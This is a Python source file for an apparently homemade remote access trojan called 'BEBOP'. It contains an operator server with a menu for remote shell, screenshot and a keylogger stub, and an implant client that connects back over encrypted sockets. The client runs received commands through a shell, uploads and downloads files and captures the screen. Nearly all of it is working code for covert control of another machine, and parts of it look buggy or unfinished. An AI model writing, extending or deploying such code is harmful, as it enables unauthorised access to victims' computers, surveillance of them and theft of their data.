
from io import BytesIO, FileIO, StringIO
import io
import socket, time, rsa, os, threading, select, readline as _, subprocess, mss, sys
from cryptography.fernet import Fernet
    
class Connection():
    def __init__(self, sock=None) -> None:
        self.connection = sock
        self.is_authed = False
        self.lck = None


    def send(self, data, header_size=12):
        if not data:
         return

        if self.is_authed:
            data = self.encrypt(data)
        
        data_size = f"{len(data):<{header_size}}"
        self.connection.sendall(data_size.encode()+data)


    def encrypt(self, data):
        return self.lck.encrypt(data)

    def decrypt(self, encrypted_data):
        return self.lck.decrypt(encrypted_data)

    def recv(self, buff_size=1024, time_out=None) -> bytes or bytearray or None:
        self.connection.settimeout(time_out)
        data_size = self.connection.recv(12)
        if not data_size:
            return None

        data_buff = bytes()
        while len(data_buff) < int(data_size):
            data_buff += self.connection.recv(buff_size)

        self.connection.settimeout(None)
        return self.decrypt(data_buff) if self.is_authed else data_buff

    def set_lck(self, key):
        self.lck = Fernet(key)
        self.is_authed = True


class Server():
    def __init__(self, ip="0.0.0.0", port=3001):
        self.address = (ip, port)
        self.clients = []
        self.curr_client : Client = None

    def establish_connection(self, max_connections=0, time_out=None) -> Connection:
            global server
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.settimeout(time_out)
            server.bind(self.address)
            server.listen(max_connections)

            print(f"[+] listening for connection on {self.address[0]}:{self.address[1]}")
            while True: 
                try:
                    tmp_con, client_addr = server.accept()
                    tmp_con = Connection(tmp_con)
                    if tmp_con:
                        client_key_buff = tmp_con.recv()
                        client_key = rsa.PublicKey.load_pkcs1(client_key_buff, 'PEM')

                        key = Fernet.generate_key()
                        tmp_con.send(rsa.encrypt(key, client_key))

                        tmp_con.set_lck(key)
                        is_ok = tmp_con.recv()
                        if is_ok == b"%%OK%%":
                            new_client = Client()
                            new_client.server = tmp_con
                            self.clients.append(new_client)
                            self.print_connections()
                        else:
                            tmp_con.close()

                except socket.timeout:
                    print("Connection request timed out. Could not connect...")
                    break

                except OSError:
                    pass

    def poll_connections(self):
        while True:
            for client in self.clients:
                poll_obj = select.poll()
                poll_obj.register(client.server.connection)
                event = poll_obj.poll()[0] 
                if event[1] == 19 or event[1] == 23: 
                    print("\nConnection lost...")
                    self.clients.remove(client)
                    break

                elif event[1] == select.POLLNVAL:
                    #KeyboardInterrupt
                    break
    
    def parse_sys_info(buff) -> str:
        device_info = ""
        for line in buff.split("&"):
            device_info += f"[+] {line}\n"

        return device_info

    def print_menu(self):
        print("\n/-------BEBOP-------/\n")
        print("1.) Open shell")
        print("2.) Take screenshot")
        print("3.) Keylogger")
        print("4.) Exit\n\n")

    def print_connections(self):
        if len(self.clients) < 1:
            self.clear_screen()
            print("waiting for connections... Press any key to refresh.")
            return
                    
        for i in range(len(self.clients)):
            print(f" {i+1}.) {self.clients[i]}")

    def clear_screen(self):
        print('\033[H')
        print('\033[2J')

    def upload_file(self, file_name):
        try:
            with open(f"{file_name}", "rb") as file:
                file_data = file.read()
                self.curr_client.server.send(data=file_data)

        except FileNotFoundError:
                print(f"Error, {file_name} not found. Check path and try again.")


    def download_file(self, file_name, buff_size=524288):
        try:
            file_data = self.curr_client.server.recv(buff_size=buff_size, time_out=5)
            if file_data:
                with open(f"{file_name}", "wb") as file:
                    file.write(file_data)
                    print(f"\nFile saved in {os.getcwd()}/{file_name}")
            else:
                print("Error, couldn't download the file.")

        except socket.timeout:
            print("Could not download file. Connection timed out. Try again later")

    def open_shell(self):
        while True:
            cmd = input("bebop831#: ")
            if cmd:
                if cmd == "exit":
                    self.curr_client.server.send(data=cmd.encode()) 
                    break

                if cmd == "clear":
                    self.clear_screen()
                    continue

                elif cmd[:2] == "dw":
                    print("Downloading...")
                    self.curr_client.server.send(data=cmd.encode()) 

                    file_name = cmd[3:]
                    self.download_file(file_name)

                elif cmd[:2] == "up":
                    print("Uploading...")
                    self.curr_client.server.send(data=cmd.encode()) 
                    file_name = cmd[3:]
                    self.upload_file(file_name)

                else:
                    self.curr_client.server.send(data=cmd.encode()) 

                    try:
                        output = self.curr_client.server.recv(time_out=30)
                        if output and output != b'%%NONE%%':
                            output = output.decode()
                            print(output)

                    except socket.timeout:
                        print("Process timed out...")
                        continue
                    
                    except ValueError:
                        print(output)

    def start(self):
        connection_thread = threading.Thread(target=self.accept_connections)
        connection_thread.start()

        poll_thread = threading.Thread(target=self.poll_connections)
        poll_thread.start()

        self.clear_screen()
        while True:
            try:
                self.print_connections()
                
                choice = input("Enter choice: ")

                if choice == "killall":
                    for client in self.clients:
                        self.clients.remove(client)
                        client.server.connection.close()
                    break
                try:
                    choice = int(choice)-1
                except ValueError:
                    self.clear_screen()
                    print("Error, enter a number\n")
                    continue

                if choice > len(self.clients)-1 or choice < 0:
                    print(choice)
                    self.clear_screen()
                    continue
                else:
                    print(f"You chose connection #{choice+1}")
                    self.curr_client = self.clients[choice]
                    self.client_handler()

            except KeyboardInterrupt:
                sys.exit(1)
                break




    def accept_connections(self):
        while True:
            new_client = Client(self.establish_connection())
            self.clients.append(new_client)

    def remove_connection(self, index):
        self.clients.pop(index)

    def client_handler(self):
        while self.curr_client:
            try:
                self.print_menu()
                choice = input("Enter choice: ")
                self.curr_client.server.send(data=choice.encode())

                if choice == "1":
                    self.open_shell()

                elif choice == "2":
                    print("\nTaking Screenshot...")        
                    self.download_file(file_name=f"{time.asctime()}.png")

                elif choice == "3":
                    pass
                elif choice.lower() == "clear":
                    self.clear_screen()

                elif choice == "4":
                    break
                
                else:
                    self.clear_screen()

            except KeyboardInterrupt:
                break

            except (ConnectionError, BrokenPipeError, socket.error) as e:
                print("\n\n[+] Connection Lost!")
                if self.clients.__contains__(self.curr_client):
                    self.clients.remove(self.curr_client)
                self.clear_screen()
                self.print_connections()
                break

        self.curr_client = None
        print('Exiting...')
        

class Client():
    #TODO
    # 1.) 
    def __init__(self, ip="0.0.0.0", port=3001, server_conn:Connection= None):
        self.ip = ip
        self.port = port
        self.server = server_conn
        self.device_name = None
        self.usr_name = None


    def establish_connection(self):
        public_key, private_key = rsa.newkeys(512)

        print("attempting to establish secure connection...")
        while True:
            try:
                tmp_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tmp_connection.connect((self.ip, self.port))
                self.server = Connection(tmp_connection)

                public_key_buff = public_key.save_pkcs1('PEM')
                self.server.send(data=public_key_buff)

                encrypted_key_buff = self.server.recv()
                if encrypted_key_buff:
                    key = rsa.decrypt(encrypted_key_buff, private_key)
                    self.server.set_lck(key)
                    self.server.send(b"%%OK%%")
                    print(f"Connection Established! Server: {self.ip}:{self.port}")
                    break
                else:
                    time.sleep(10)

            except ConnectionRefusedError:
                print("establish_connection(): Connection Refused")
                time.sleep(5)

            except Exception as e:
                print("establish_connection(): exception occurred")
                print(e)

    def open_shell(self):
        while True:
            try:
                cmd = self.server.recv(time_out=15)
            except socket.timeout:
                break

            cmd_output_buff = b""

            if not cmd or cmd == b'exit':
                break
            else:
                cmd = cmd.decode()

            if cmd[:2] == "cd":
                dir = cmd[3:]
                try:
                    os.chdir(dir)
                except FileNotFoundError as e:
                    cmd_output_buff = str(e).encode()
                else:
                    cmd_output_buff = os.getcwd().encode()

            elif cmd[:2] == "dw":
                file_name = cmd[3:]
                print(f"Uploading File...{file_name}")
                self.upload_file(file_name)
                continue

            elif cmd[:2] == "up":
                file_name = cmd[3:]
                print(f"Downloading File...{file_name}")
                self.download_file(file_name=file_name, file_path=os.getcwd())
                continue

            else: 
                from io import BytesIO
                in_buff = BytesIO()
                out_buff = BytesIO()

                sys.stdin = in_buff
                proc = subprocess.Popen(f'{cmd}', shell=True, stdout=out_buff, stderr=subprocess.STDOUT)
                while True:
                    for line in iter(proc.stdout.readlines, b''):
                        cmd_output_buff += line
                    self.server.send(cmd_output_buff)
                    cmd = self.server.recv(time_out=15)
                    if cmd == b"exit":
                        break
                    in_buff.write(cmd.decode())
                    in_buff.flush()


            if not cmd_output_buff:
                cmd_output_buff = b'%%NONE%%'

            self.server.send(data=cmd_output_buff)
    
    def take_screen_shot(self):
        try:
            if mss.mss().monitors:
                raw_pixels = mss.mss().grab(mss.mss().monitors[0])
                img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
                self.server.send(data=img_data)

        except mss.ScreenShotError:
            print("Unable to take screenshot.")

    def start(self):
        self.establish_connection()
        
        while True:
            try:
                choice = self.server.recv()
                if not choice:
                    continue

                elif choice == b"1":
                    print("Opening Shell...")
                    self.open_shell()

                elif choice == b"2":
                    self.take_screen_shot()

                elif choice == b"3":
                    pass

                elif choice == b"4":
                    time.sleep(5)

            except KeyboardInterrupt:
                break

            except (ConnectionError, OSError, socket.error) as e:
                print(e)
                self.server.connection.close()
                self.establish_connection()

        self.server.connection.close()

# c = input("Is server?: ").lower()

# if c == "y" or c == "yes":
#     s = Server()
#     s.start()
# else:
#     c = Client()
#     c.start()

import pty, tty

def main():
    master, _ = pty.openpty()
    sys.stdin = io.BytesIO()
    proc = subprocess.Popen("/bin/bash", shell=True, stdin=master)
    os.write(master, b'ls')
    proc.communicate(b'ls')
    
    
        
main()